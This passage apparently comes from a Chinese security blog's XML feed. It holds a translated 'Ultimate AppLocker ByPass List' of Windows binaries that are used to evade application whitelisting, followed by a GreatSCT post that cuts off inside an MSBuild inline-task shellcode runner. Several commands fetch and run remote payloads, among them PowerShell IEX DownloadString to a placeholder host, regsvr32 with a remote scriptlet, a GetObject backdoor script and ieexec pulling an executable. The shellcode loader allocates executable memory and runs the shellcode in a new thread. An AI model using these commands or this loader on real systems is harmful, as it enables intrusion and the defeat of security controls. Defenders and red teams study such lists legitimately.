&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/1515495242360.jpg" alt="enter description here"></p><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/1515495313615.jpg" alt="enter description here"></p><p><a href="https://docs.microsoft.com/zh-cn/dotnet/csharp/language-reference/compiler-options/command-line-building-with-csc-exe">https://docs.microsoft.com/zh-cn/dotnet/csharp/language-reference/compiler-options/command-line-building-with-csc-exe</a></p>]]></content>
      
      
      <categories>
          
          <category> ATT&amp;CK </category>
          
          <category> C2 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> windows </tag>
            
            <tag> ATT&amp;CK </tag>
            
            <tag> C2 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Ultimate AppLocker ByPass List</title>
      <link href="/UltimateAppLockerByPassList.html"/>
      <url>/UltimateAppLockerByPassList.html</url>
      
        <content type="html"><![CDATA[<p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/maxresdfault.jpg" alt="enter description here"></p><span id="more"></span><p>GIthub ：<a href="https://github.com/api0cradle/UltimateAppLockerByPassList">https://github.com/api0cradle/UltimateAppLockerByPassList</a><br>此存储库的目标是记录最常用的技术来绕过AppLocker。本自述文件包含所有已知绕过路径的完整列表。由于AppLocker可以以不同的方式进行配置，所以有一个绕过主列表是有意义的。这README.MD将是主，并将更新已知和可能的AppLocker绕过。</p><p>我已经创建了一个验证Bypass列表，再次使用AppLocker创建的默认规则。</p><p>有关我如何验证的详细信息，可以查看他的博客：<a href="https://oddvar.moe/2017/12/13/applocker-case-study-how-insecure-is-it-really-part-1/">https://oddvar.moe/2017/12/13/applocker-case-study-how-insecure-is-it-really-part-1/</a></p><p>VerifiedBypasses-DefaultRules.MD</p><p>如果您想知道如何创建默认规则，您可以按照以下指南进行操作：https： &#x2F;&#x2F;<a href="http://www.rootusers.com/implement-applocker-rules/">www.rootusers.com/implement-applocker-rules/</a></p><p>请贡献并指出我忘记的错误或资源。请记住，必须验证BypassDLL和BypassEXE的旁路技术。BypassDLL-DefaultRules和BypassEXE-DefaultRules列表应该只包含有效的绕过。</p><h2 id="Rundll32-exe"><a href="#Rundll32-exe" class="headerlink" title="Rundll32.exe"></a>Rundll32.exe</h2><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">rundll32<span class="selector-class">.exe</span> javascript:<span class="string">&quot;\..\mshtml,RunHTMLApplication&quot;</span>;document<span class="selector-class">.write</span>();new%<span class="number">20</span>A</span><br><span class="line"><span class="function"><span class="title">ctiveXObject</span><span class="params">(<span class="string">&quot;WScript.Shell&quot;</span>)</span></span><span class="selector-class">.Run</span>(<span class="string">&quot;powershell -nop -exec bypass -c IEX (New-Object</span></span><br><span class="line"><span class="string">Net.WebClient).DownloadString(&#x27;http://ip:port/&#x27;);&quot;</span></span><br></pre></td></tr></table></figure><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">rundll32<span class="selector-class">.exe</span> javascript:<span class="string">&quot;\..\mshtml.dll,RunHTMLApplication &quot;</span>;<span class="built_in">eval</span>(<span class="string">&quot;w=new%20ActiveXO</span></span><br><span class="line"><span class="string">bject(\&quot;WScript.Shell\&quot;);w.run(\&quot;calc\&quot;);window.close()&quot;</span>);`</span><br></pre></td></tr></table></figure><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">`rundll32<span class="selector-class">.exe</span> javascript:<span class="string">&quot;\..\mshtml,RunHTMLApplication &quot;</span>;document<span class="selector-class">.write</span>();h=new%<span class="number">20</span>A</span><br><span class="line"><span class="function"><span class="title">ctiveXObject</span><span class="params">(<span class="string">&quot;WScript.Shell&quot;</span>)</span></span><span class="selector-class">.run</span>(<span class="string">&quot;calc.exe&quot;</span>,<span class="number">0</span>,true);try&#123;h<span class="selector-class">.Send</span>();b=h<span class="selector-class">.ResponseT</span></span><br><span class="line">ext;<span class="built_in">eval</span>(b;&#125;<span class="built_in">catch</span>(e)&#123;new%<span class="number">20</span><span class="built_in">ActiveXObject</span>(<span class="string">&quot;WScript.Shell&quot;</span>)<span class="selector-class">.Run</span>(<span class="string">&quot;cmd /c taskkill </span></span><br><span class="line"><span class="string">/f /im rundll32.exe&quot;</span>,<span class="number">0</span>,true);&#125;`</span><br></pre></td></tr></table></figure><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">`rundll32<span class="selector-class">.exe</span> javascript:<span class="string">&quot;\..\mshtml,RunHTMLApplication &quot;</span>;document<span class="selector-class">.write</span>();GetOb</span><br><span class="line"><span class="built_in">ject</span>(<span class="string">&quot;script:https://raw.githubusercontent.com/3gstudent/</span></span><br><span class="line"><span class="string">Javascript-Backdoor/master/test&quot;</span>)`</span><br></pre></td></tr></table></figure><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">`rundll32 shell32<span class="selector-class">.dll</span>,Control_RunDLL payload.dll`</span><br></pre></td></tr></table></figure><p>Requires admin: No</p><p>Notes:</p><p>Links:<br><a href="https://pentestlab.blog/2017/05/23/applocker-bypass-rundll32/">https://pentestlab.blog/2017/05/23/applocker-bypass-rundll32/</a><br><a href="https://evi1cg.me/archives/AppLocker_Bypass_Techniques.html#menu_index_7">https://evi1cg.me/archives/AppLocker_Bypass_Techniques.html#menu_index_7</a><br><a href="https://github.com/redcanaryco/atomic-red-team/blob/master/Windows/Execution/Rundll32.md">https://github.com/redcanaryco/atomic-red-team/blob/master/Windows/Execution/Rundll32.md</a></p><h2 id="Regsvr32-exe"><a href="#Regsvr32-exe" class="headerlink" title="Regsvr32.exe"></a>Regsvr32.exe</h2><p>regsvr32 &#x2F;s &#x2F;n &#x2F;u &#x2F;i:<a href="http://example.com/file.sct">http://example.com/file.sct</a> scrobj.dll&#96;</p><p>Requires admin: No</p><p>Notes:</p><p>Links:<br><a href="https://gist.github.com/subTee/24c7d8e1ff0f5602092f58cbb3f7d302">https://gist.github.com/subTee/24c7d8e1ff0f5602092f58cbb3f7d302</a><br><a href="https://github.com/redcanaryco/atomic-red-team/blob/master/Windows/Execution/Regsvr32.md">https://github.com/redcanaryco/atomic-red-team/blob/master/Windows/Execution/Regsvr32.md</a></p><h2 id="Msbuild-exe"><a href="#Msbuild-exe" class="headerlink" title="Msbuild.exe"></a>Msbuild.exe</h2><p><code>msbuild.exe pshell.xml</code></p><p>Requires admin: No</p><p>Notes:</p><p>Links:<br><a href="https://gist.github.com/subTee/6b236083da2fd6ddff216e434f257614">https://gist.github.com/subTee/6b236083da2fd6ddff216e434f257614</a><br><a href="http://subt0x10.blogspot.no/2017/04/bypassing-application-whitelisting.html">http://subt0x10.blogspot.no/2017/04/bypassing-application-whitelisting.html</a><br><a href="https://github.com/Cn33liz/MSBuildShell">https://github.com/Cn33liz/MSBuildShell</a><br><a href="https://github.com/Cn33liz/MS17-012">https://github.com/Cn33liz/MS17-012</a><br><a href="https://pentestlab.blog/2017/05/29/applocker-bypass-msbuild/">https://pentestlab.blog/2017/05/29/applocker-bypass-msbuild/</a><br><a href="https://www.youtube.com/watch?v=aSDEAPXaz28">https://www.youtube.com/watch?v=aSDEAPXaz28</a><br><a href="https://github.com/redcanaryco/atomic-red-team/blob/master/Windows/Execution/Trusted_Developer_Utilities.md">https://github.com/redcanaryco/atomic-red-team/blob/master/Windows/Execution/Trusted_Developer_Utilities.md</a></p><h2 id="Regsvcs-exe"><a href="#Regsvcs-exe" class="headerlink" title="Regsvcs.exe"></a>Regsvcs.exe</h2><p><code>regsvcs.exe /U regsvcs.dll</code><br><code>regsvcs.exe regsvcs.dll</code></p><p>Requires admin: ?</p><p>Notes:</p><p>Links:<br><a href="https://pentestlab.blog/2017/05/19/applocker-bypass-regasm-and-regsvcs/">https://pentestlab.blog/2017/05/19/applocker-bypass-regasm-and-regsvcs/</a><br><a href="https://github.com/redcanaryco/atomic-red-team/blob/master/Windows/Payloads/RegSvcsRegAsmBypass.cs">https://github.com/redcanaryco/atomic-red-team/blob/master/Windows/Payloads/RegSvcsRegAsmBypass.cs</a><br><a href="https://github.com/redcanaryco/atomic-red-team/blob/master/Windows/Execution/RegsvcsRegasm.md">https://github.com/redcanaryco/atomic-red-team/blob/master/Windows/Execution/RegsvcsRegasm.md</a></p><h2 id="Regasm-exe"><a href="#Regasm-exe" class="headerlink" title="Regasm.exe"></a>Regasm.exe</h2><p><code>regasm.exe /U regsvcs.dll</code><br><code>regasm.exe regsvcs.dll</code></p><p>Requires admin: ?</p><p>Notes:</p><p>Links:<br><a href="https://pentestlab.blog/2017/05/19/applocker-bypass-regasm-and-regsvcs/">https://pentestlab.blog/2017/05/19/applocker-bypass-regasm-and-regsvcs/</a><br><a href="https://github.com/redcanaryco/atomic-red-team/blob/master/Windows/Payloads/RegSvcsRegAsmBypass.cs">https://github.com/redcanaryco/atomic-red-team/blob/master/Windows/Payloads/RegSvcsRegAsmBypass.cs</a><br><a href="https://github.com/redcanaryco/atomic-red-team/blob/master/Windows/Execution/RegsvcsRegasm.md">https://github.com/redcanaryco/atomic-red-team/blob/master/Windows/Execution/RegsvcsRegasm.md</a></p><h2 id="Bginfo-exe"><a href="#Bginfo-exe" class="headerlink" title="Bginfo.exe"></a>Bginfo.exe</h2><p><code>bginfo.exe bginfo.bgi /popup /nolicprompt</code></p><p>Requires admin: No</p><p>Notes:</p><p>Links:<br><a href="https://msitpros.com/?p=3831">https://msitpros.com/?p=3831</a><br><a href="https://pentestlab.blog/2017/06/05/applocker-bypass-bginfo/">https://pentestlab.blog/2017/06/05/applocker-bypass-bginfo/</a><br><a href="https://msitpros.com/?p=3860">https://msitpros.com/?p=3860</a></p><h2 id="InstallUtil-exe"><a href="#InstallUtil-exe" class="headerlink" title="InstallUtil.exe"></a>InstallUtil.exe</h2><p><code>InstallUtil.exe /logfile= /LogToConsole=false /U AllTheThings.dll</code></p><p>Requires admin: No</p><p>Notes:</p><p>Links:<br><a href="https://github.com/subTee/AllTheThings">https://github.com/subTee/AllTheThings</a><br><a href="https://pentestlab.blog/2017/05/08/applocker-bypass-installutil/">https://pentestlab.blog/2017/05/08/applocker-bypass-installutil/</a><br><a href="https://evi1cg.me/archives/AppLocker_Bypass_Techniques.html#menu_index_12">https://evi1cg.me/archives/AppLocker_Bypass_Techniques.html#menu_index_12</a><br><a href="http://subt0x10.blogspot.no/2017/09/banned-file-execution-via.html">http://subt0x10.blogspot.no/2017/09/banned-file-execution-via.html</a><br><a href="https://github.com/redcanaryco/atomic-red-team/blob/master/Windows/Execution/InstallUtil.md">https://github.com/redcanaryco/atomic-red-team/blob/master/Windows/Execution/InstallUtil.md</a></p><h2 id="MSDT-exe"><a href="#MSDT-exe" class="headerlink" title="MSDT.exe"></a>MSDT.exe</h2><p><code>Open .diagcab package</code></p><p>Requires admin: ?</p><p>Notes:</p><p>Links:<br><a href="https://cybersyndicates.com/2015/10/a-no-bull-guide-to-malicious-windows-trouble-shooting-packs-and-application-whitelist-bypass/">https://cybersyndicates.com/2015/10/a-no-bull-guide-to-malicious-windows-trouble-shooting-packs-and-application-whitelist-bypass/</a></p><h2 id="mshta-exe"><a href="#mshta-exe" class="headerlink" title="mshta.exe"></a>mshta.exe</h2><p><code>mshta.exe evilfile.hta</code></p><p>Requires admin: No</p><p>Notes:</p><p>Links:<br><a href="https://evi1cg.me/archives/AppLocker_Bypass_Techniques.html#menu_index_4">https://evi1cg.me/archives/AppLocker_Bypass_Techniques.html#menu_index_4</a></p><h2 id="Execute-Bat"><a href="#Execute-Bat" class="headerlink" title="Execute .Bat"></a>Execute .Bat</h2><p><code>cmd.exe /k &lt; script.txt</code></p><p>Requires admin: No</p><p>Notes:</p><p>Links:<br><a href="https://evi1cg.me/archives/AppLocker_Bypass_Techniques.html#menu_index_3">https://evi1cg.me/archives/AppLocker_Bypass_Techniques.html#menu_index_3</a></p><h2 id="Execute-PS1"><a href="#Execute-PS1" class="headerlink" title="Execute .PS1"></a>Execute .PS1</h2><p><code>Get-Content script.txt | iex</code></p><p>Requires admin: No</p><p>Notes:</p><p>Links:<br><a href="https://evi1cg.me/archives/AppLocker_Bypass_Techniques.html#menu_index_3">https://evi1cg.me/archives/AppLocker_Bypass_Techniques.html#menu_index_3</a></p><h2 id="Execute-VBS"><a href="#Execute-VBS" class="headerlink" title="Execute .VBS"></a>Execute .VBS</h2><p><code>cscript.exe //E:vbscript script.txt</code></p><p>Requires admin: No</p><p>Notes:</p><p>Links:<br><a href="https://evi1cg.me/archives/AppLocker_Bypass_Techniques.html#menu_index_3">https://evi1cg.me/archives/AppLocker_Bypass_Techniques.html#menu_index_3</a></p><h2 id="PresentationHost-exe"><a href="#PresentationHost-exe" class="headerlink" title="PresentationHost.exe"></a>PresentationHost.exe</h2><p>Missing Example</p><p>Requires admin: ?</p><p>Notes:</p><p>Links:<br><a href="https://raw.githubusercontent.com/subTee/ShmooCon-2015/master/ShmooCon-2015-Simple-WLEvasion.pdf">https://raw.githubusercontent.com/subTee/ShmooCon-2015/master/ShmooCon-2015-Simple-WLEvasion.pdf</a></p><h2 id="dfsvc-exe"><a href="#dfsvc-exe" class="headerlink" title="dfsvc.exe"></a>dfsvc.exe</h2><p>Missing Example</p><p>Requires admin: ?</p><p>Notes:</p><p>Links:<br><a href="https://raw.githubusercontent.com/subTee/ShmooCon-2015/master/ShmooCon-2015-Simple-WLEvasion.pdf">https://raw.githubusercontent.com/subTee/ShmooCon-2015/master/ShmooCon-2015-Simple-WLEvasion.pdf</a></p><h2 id="IEExec-exe"><a href="#IEExec-exe" class="headerlink" title="IEExec.exe"></a>IEExec.exe</h2><p><code>ieexec.exe http://x.x.x.x:8080/bypass.exe</code></p><p>Requires admin: ?</p><p>Notes:</p><p>Links:<br><a href="https://room362.com/post/2014/2014-01-16-application-whitelist-bypass-using-ieexec-dot-exe/">https://room362.com/post/2014/2014-01-16-application-whitelist-bypass-using-ieexec-dot-exe/</a></p><h2 id="cdb-exe"><a href="#cdb-exe" class="headerlink" title="cdb.exe"></a>cdb.exe</h2><p><code>cdb.exe -cf x64_calc.wds -o notepad.exe</code></p><p>Requires admin: ?</p><p>Notes:</p><p>Links:<br><a href="http://www.exploit-monday.com/2016/08/windbg-cdb-shellcode-runner.html">http://www.exploit-monday.com/2016/08/windbg-cdb-shellcode-runner.html</a></p><h2 id="dnx-exe"><a href="#dnx-exe" class="headerlink" title="dnx.exe"></a>dnx.exe</h2><p><code>dnx.exe consoleapp</code></p><p>Requires admin: ?</p><p>Notes:</p><p>Links:<br><a href="https://enigma0x3.net/2016/11/17/bypassing-application-whitelisting-by-using-dnx-exe/">https://enigma0x3.net/2016/11/17/bypassing-application-whitelisting-by-using-dnx-exe/</a></p><h2 id="rcsi-exe"><a href="#rcsi-exe" class="headerlink" title="rcsi.exe"></a>rcsi.exe</h2><p><code>rcsi.exe bypass.csx</code></p><p>Requires admin: ?</p><p>Notes:</p><p>Links:<br><a href="https://enigma0x3.net/2016/11/21/bypassing-application-whitelisting-by-using-rcsi-exe/">https://enigma0x3.net/2016/11/21/bypassing-application-whitelisting-by-using-rcsi-exe/</a></p><h2 id="csi-exe"><a href="#csi-exe" class="headerlink" title="csi.exe"></a>csi.exe</h2><p>Missing example</p><p>Requires admin: ?</p><p>Notes:</p><p>Links:<br><a href="https://web.archive.org/web/20161008143428/http://subt0x10.blogspot.com/2016/09/application-whitelisting-bypass-csiexe.html">https://web.archive.org/web/20161008143428/http://subt0x10.blogspot.com/2016/09/application-whitelisting-bypass-csiexe.html</a></p><h2 id="CPL-loading-location-manipulation"><a href="#CPL-loading-location-manipulation" class="headerlink" title="CPL loading location manipulation"></a>CPL loading location manipulation</h2><p><code>Control.exe</code></p><p>Requires admin: No</p><p>Notes:</p><p>Links:<br><a href="https://pentestlab.blog/2017/05/24/applocker-bypass-control-panel/">https://pentestlab.blog/2017/05/24/applocker-bypass-control-panel/</a><br><a href="https://www.contextis.com/resources/blog/applocker-bypass-registry-key-manipulation/">https://www.contextis.com/resources/blog/applocker-bypass-registry-key-manipulation/</a></p><h2 id="msxsl-exe"><a href="#msxsl-exe" class="headerlink" title="msxsl.exe"></a>msxsl.exe</h2><p><code>msxsl.exe customers.xml script.xsl</code></p><p>Requires admin: No</p><p>Notes:</p><p>Links:<br><a href="https://pentestlab.blog/2017/07/06/applocker-bypass-msxsl/">https://pentestlab.blog/2017/07/06/applocker-bypass-msxsl/</a><br><a href="https://gist.github.com/subTee/d9380299ff35738723cb44f230ab39a1">https://gist.github.com/subTee/d9380299ff35738723cb44f230ab39a1</a></p><h2 id="msiexec-exe"><a href="#msiexec-exe" class="headerlink" title="msiexec.exe"></a>msiexec.exe</h2><p><code>msiexec /quiet /i cmd.msi</code><br><code>msiexec /q /i http://192.168.100.3/tmp/cmd.png</code></p><p>Requires admin: ?</p><p>Notes:</p><p>Links:<br><a href="https://pentestlab.blog/2017/06/16/applocker-bypass-msiexec/">https://pentestlab.blog/2017/06/16/applocker-bypass-msiexec/</a></p><h2 id="cmstp-exe"><a href="#cmstp-exe" class="headerlink" title="cmstp.exe"></a>cmstp.exe</h2><p><code>cmstp.exe /ni /s c:\cmstp\CorpVPN.inf</code></p><p>Requires admin: No</p><p>Notes:</p><p>Links:<br><a href="https://msitpros.com/?p=3960">https://msitpros.com/?p=3960</a><br><a href="https://gist.github.com/api0cradle/cf36fd40fa991c3a6f7755d1810cc61e">https://gist.github.com/api0cradle/cf36fd40fa991c3a6f7755d1810cc61e</a></p><h2 id="xwizard-exe"><a href="#xwizard-exe" class="headerlink" title="xwizard.exe"></a>xwizard.exe</h2><p><code>xwizard.exe argument1 argument2</code><br>DLL loading in same folder xwizard.dll</p><p>Requires admin: No</p><p>Notes:</p><p>Links:<br><a href="http://www.hexacorn.com/blog/2017/07/31/the-wizard-of-x-oppa-plugx-style/">http://www.hexacorn.com/blog/2017/07/31/the-wizard-of-x-oppa-plugx-style/</a></p><h2 id="fsi-exe"><a href="#fsi-exe" class="headerlink" title="fsi.exe"></a>fsi.exe</h2><p><code>fsi.exe c:\folder\d.fscript</code></p><p>Requires admin: No</p><p>Notes:</p><p>Links:<br><a href="https://gist.github.com/NickTyrer/51eb8c774a909634fa69b4d06fc79ae1">https://gist.github.com/NickTyrer/51eb8c774a909634fa69b4d06fc79ae1</a><br><a href="https://twitter.com/NickTyrer/status/904273264385589248">https://twitter.com/NickTyrer/status/904273264385589248</a><br><a href="https://docs.microsoft.com/en-us/dotnet/fsharp/tutorials/fsharp-interactive/">https://docs.microsoft.com/en-us/dotnet/fsharp/tutorials/fsharp-interactive/</a></p><h2 id="odbcconf-exe"><a href="#odbcconf-exe" class="headerlink" title="odbcconf.exe"></a>odbcconf.exe</h2><p><code>odbcconf -f file.rsp</code></p><p>Requires admin: ?</p><p>Notes:</p><p>Links:<br><a href="https://gist.github.com/NickTyrer/6ef02ce3fd623483137b45f65017352b">https://gist.github.com/NickTyrer/6ef02ce3fd623483137b45f65017352b</a></p><h2 id="te-exe"><a href="#te-exe" class="headerlink" title="te.exe"></a>te.exe</h2><p><code>te.exe bypass.wsc</code></p><p>Requires admin: No</p><p>Notes: Can be used if the Test Authoring and Execution Framework is installed and is in a path that is whitelisted.<br>Default location is: C:\program files (x86)\Windows Kits\10\testing\Runtimes\TAEF</p><p>Links:<br><a href="https://twitter.com/gN3mes1s/status/927680266390384640">https://twitter.com/gN3mes1s/status/927680266390384640</a><br><a href="https://gist.github.com/N3mes1s/5b75a4cd6aa4d41bb742acace2c8ab42">https://gist.github.com/N3mes1s/5b75a4cd6aa4d41bb742acace2c8ab42</a></p><h2 id="Placing-files-in-writeable-paths-under-c-windows"><a href="#Placing-files-in-writeable-paths-under-c-windows" class="headerlink" title="Placing files in writeable paths under c:\windows"></a>Placing files in writeable paths under c:\windows</h2><p>The following folders are by default writable and executable by normal users<br><code>C:\Windows\System32\Microsoft\Crypto\RSA\MachineKeys</code><br><code>C:\Windows\System32\spool\drivers\color</code><br><code>C:\Windows\Tasks</code><br><code>C:\windows\tracing</code></p><p>Requires admin: No</p><p>Notes: This list is based on Windows 10 1709. Run accesschk to verify on other Windows versions</p><h2 id="Atbroker-exe"><a href="#Atbroker-exe" class="headerlink" title="Atbroker.exe"></a>Atbroker.exe</h2><p><code>ATBroker.exe /start malware</code></p><p>Requires admin: No</p><p>Notes:</p><p>Links:<br><a href="http://www.hexacorn.com/blog/2016/07/22/beyond-good-ol-run-key-part-42/">http://www.hexacorn.com/blog/2016/07/22/beyond-good-ol-run-key-part-42/</a></p><h2 id="WMIC-exe"><a href="#WMIC-exe" class="headerlink" title="WMIC.exe"></a>WMIC.exe</h2><p><code>wmic process call create calc</code></p><p>Requires admin: No</p><p>Notes: </p><p>Links:<br><a href="https://stackoverflow.com/questions/24658745/wmic-how-to-use-process-call-create-with-a-specific-working-directory">https://stackoverflow.com/questions/24658745/wmic-how-to-use-process-call-create-with-a-specific-working-directory</a></p><h2 id="MavInject32-exe"><a href="#MavInject32-exe" class="headerlink" title="MavInject32.exe"></a>MavInject32.exe</h2><p><code>MavInject32.exe &lt;PID&gt; /INJECTRUNNING &lt;PATH DLL&gt;</code></p><p>Requires admin: No</p><p>Notes: </p><p>Links:<br><a href="https://twitter.com/gN3mes1s/status/941315826107510784">https://twitter.com/gN3mes1s/status/941315826107510784</a><br><a href="https://twitter.com/Hexacorn/status/776122138063409152">https://twitter.com/Hexacorn/status/776122138063409152</a></p><h1 id="Bypass-DLL-Default-AppLocker-Rules"><a href="#Bypass-DLL-Default-AppLocker-Rules" class="headerlink" title="Bypass DLL Default AppLocker Rules"></a>Bypass DLL Default AppLocker Rules</h1><p>The goal of this list is document a verified list of known bypasses using AppLocker Default Rules for DLL whitelisting.<br>Please contribute and do point out errors or resources I have forgotten.</p><h2 id="Msbuild-exe-1"><a href="#Msbuild-exe-1" class="headerlink" title="Msbuild.exe"></a>Msbuild.exe</h2><p><code>msbuild.exe pshell.xml</code></p><p>Requires admin: No</p><p>Notes:</p><p>Links:<br><a href="https://github.com/Cn33liz/MSBuildShell">https://github.com/Cn33liz/MSBuildShell</a><br><a href="https://github.com/Cn33liz/MS17-012">https://github.com/Cn33liz/MS17-012</a><br><a href="https://pentestlab.blog/2017/05/29/applocker-bypass-msbuild/">https://pentestlab.blog/2017/05/29/applocker-bypass-msbuild/</a><br><a href="https://www.youtube.com/watch?v=aSDEAPXaz28">https://www.youtube.com/watch?v=aSDEAPXaz28</a><br><a href="https://github.com/redcanaryco/atomic-red-team/blob/master/Windows/Execution/Trusted_Developer_Utilities.md">https://github.com/redcanaryco/atomic-red-team/blob/master/Windows/Execution/Trusted_Developer_Utilities.md</a></p>]]></content>
      
      
      <categories>
          
          <category> ATT&amp;CK </category>
          
      </categories>
      
      
        <tags>
            
            <tag> windows </tag>
            
            <tag> ATT&amp;CK </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>GreatSCT | MSF  | 白名单</title>
      <link href="/GreatSCT.html"/>
      <url>/GreatSCT.html</url>
      
        <content type="html"><![CDATA[<p>Github <a href="https://github.com/GreatSCT/GreatSCT">https://github.com/GreatSCT/GreatSCT</a></p><h2 id="视频演示："><a href="#视频演示：" class="headerlink" title="视频演示："></a>视频演示：</h2><iframe     width="800"     height="450"     src='https://demonsec666.oss-cn-qingdao.aliyuncs.com/GreatSC.mp4'    frameborder="0"     allowfullscreen></iframe><h2 id="1-简介"><a href="#1-简介" class="headerlink" title="1.简介"></a>1.简介</h2><p>Casey Smith 发现了一个名为“msbuild.exe”的微软二进制文件。他在2016年9月13日星期二写了一篇博客，标题为“使用MSBuild.exe绕过应用程序白名单 - 设备保护示例和缓解措施”。他的博客已经不存在了，但是你可以在这里通过archive.org访问它 <a href="https://web.archive.org/web/20161212224652/http://subt0x10.blogspot.com/2016/09/bypassing-application-whitelisting.html">https://web.archive.org/web/20161212224652/http://subt0x10.blogspot.com/2016/09/bypassing-application-whitelisting.html</a></p><h2 id="2-POC-code"><a href="#2-POC-code" class="headerlink" title="2.POC  -code"></a>2.POC  -code</h2><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">&lt;Project ToolsVersion=<span class="string">&quot;4.0&quot;</span> xmlns=<span class="string">&quot;http://schemas.microsoft.com/developer/msbuild/2003&quot;</span>&gt;</span><br><span class="line">         &lt;!-- This inline task executes shellcode. --&gt;</span><br><span class="line">         &lt;!-- C:\Windows\Microsoft.NET\Framework\v4.<span class="number">0.30319</span>\msbuild<span class="selector-class">.exe</span> SimpleTasks<span class="selector-class">.csproj</span> --&gt;</span><br><span class="line">         &lt;!-- Save This File And Execute The Above Command --&gt;</span><br><span class="line">         &lt;!-- Author: Casey Smith, Twitter: @subTee --&gt;</span><br><span class="line">         &lt;!-- License: BSD <span class="number">3</span>-Clause --&gt;</span><br><span class="line">  &lt;Target Name=<span class="string">&quot;Hello&quot;</span>&gt;</span><br><span class="line">    &lt;ClassExample /&gt;</span><br><span class="line">  &lt;/Target&gt;</span><br><span class="line">  &lt;UsingTask</span><br><span class="line">    TaskName=<span class="string">&quot;ClassExample&quot;</span></span><br><span class="line">    TaskFactory=<span class="string">&quot;CodeTaskFactory&quot;</span></span><br><span class="line">    AssemblyFile=<span class="string">&quot;C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Build.Tasks.v4.0.dll&quot;</span> &gt;</span><br><span class="line">    &lt;Task&gt;</span><br><span class="line">    </span><br><span class="line">      &lt;Code Type=<span class="string">&quot;Class&quot;</span> Language=<span class="string">&quot;cs&quot;</span>&gt;</span><br><span class="line">      &lt;!<span class="selector-attr">[CDATA[using System;using System.Runtime.InteropServices;using Microsoft.Build.Framework;using Microsoft.Build.Utilities;public class ClassExample :  Task, ITask&#123;           private static UInt32 MEM_COMMIT = 0x1000;            private static UInt32 PAGE_EXECUTE_READWRITE = 0x40;            [DllImport(<span class="string">&quot;kernel32&quot;</span>)]</span></span><br><span class="line">    private static extern UInt32 <span class="built_in">VirtualAlloc</span>(UInt32 lpStartAddr,</span><br><span class="line">    UInt32 size, UInt32 flAllocationType, UInt32 flProtect);          </span><br><span class="line">  <span class="selector-attr">[DllImport(<span class="string">&quot;kernel32&quot;</span>)]</span></span><br><span class="line">    private static extern IntPtr <span class="built_in">CreateThread</span>(            </span><br><span class="line">    UInt32 lpThreadAttributes,</span><br><span class="line">    UInt32 dwStackSize,</span><br><span class="line">    UInt32 lpStartAddress,</span><br><span class="line">    IntPtr param,</span><br><span class="line">    UInt32 dwCreationFlags,</span><br><span class="line">    ref UInt32 lpThreadId           </span><br><span class="line">    );</span><br><span class="line">  <span class="selector-attr">[DllImport(<span class="string">&quot;kernel32&quot;</span>)]</span></span><br><span class="line">    private static extern UInt32 <span class="built_in">WaitForSingleObject</span>(           </span><br><span class="line">    IntPtr hHandle,</span><br><span class="line">    UInt32 dwMilliseconds</span><br><span class="line">    );          </span><br><span class="line">  public override bool <span class="built_in">Execute</span>()</span><br><span class="line">  &#123;</span><br><span class="line">    byte<span class="selector-attr">[]</span> shellcode = new byte<span class="selector-attr">[]</span> &#123; INSERT_SHELLCODE_HERE &#125;;</span><br><span class="line">      </span><br><span class="line">      UInt32 funcAddr = <span class="built_in">VirtualAlloc</span>(<span class="number">0</span>, (UInt32)shellcode<span class="selector-class">.Length</span>,</span><br><span class="line">MEM_COMMIT, PAGE_EXECUTE_READWRITE);</span><br><span class="line">      Marshal<span class="selector-class">.Copy</span>(shellcode, <span class="number">0</span>, (IntPtr)(funcAddr), shellcode.Length);</span><br><span class="line">      IntPtr hThread = IntPtr.Zero;</span><br><span class="line">      UInt32 threadId = <span class="number">0</span>;</span><br><span class="line">      IntPtr pinfo = IntPtr.Zero;</span><br><span class="line">      hThread = <span class="built_in">CreateThread</span>(<span class="number">0</span>, <span class="number">0</span>, funcAddr, pinfo, <span class="number">0</span>, ref threadId);</span><br><span class="line">      <span class="built_in">WaitForSingleObject</span>(hThread, <span class="number">0</span>xFFFFFFFF);</span><br><span class="line">      return true;</span><br><span class="line">  &#125; </span><br><span class="line">&#125;     </span><br><span class="line">      ]]&gt;</span><br><span class="line">      